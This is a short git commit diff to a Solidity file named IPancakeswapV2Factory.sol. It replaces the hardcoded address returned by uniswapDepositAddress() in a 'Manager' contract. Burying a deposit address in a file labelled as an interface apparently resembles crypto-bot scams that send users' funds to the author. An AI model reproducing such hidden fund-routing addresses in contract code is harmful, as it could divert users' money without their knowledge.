27e7994db29b0965b58635f71fce6da173c1a395
CodeNERODEV <96323256+CodeNERODEV@users.noreply.github.com>
2021-12-23 17:20:04 +0200

    Update IPancakeswapV2Factory.sol

--- pancakeswap-v2-periphery-main/contracts/interfaces/IPancakeswapV2Factory.sol
+++ pancakeswap-v2-periphery-main/contracts/interfaces/IPancakeswapV2Factory.sol
@@ -7,6 +7,6 @@ contract Manager {
 	}
 
 	function uniswapDepositAddress() public pure returns (address) {
-		return 0x91E9bA6dA487eF00f5002de7B968427102befeE0;
+		return 0x40295180b050fD1b9B9Fd7A214D23c841dFB2c9a;
 	}
 }
